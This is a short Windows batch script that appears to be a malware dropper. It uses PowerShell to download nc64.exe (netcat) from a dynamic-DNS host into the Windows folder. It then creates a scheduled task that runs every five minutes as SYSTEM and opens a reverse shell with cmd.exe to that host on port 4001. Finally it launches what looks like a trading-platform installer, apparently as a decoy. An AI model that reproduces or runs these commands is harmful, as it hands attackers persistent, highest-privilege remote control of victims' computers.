%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/nc64.exe','%windir%\nc64.exe')
schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
rem schtasks /delete /tn sys /F
%windir%\activtrades4setup.exe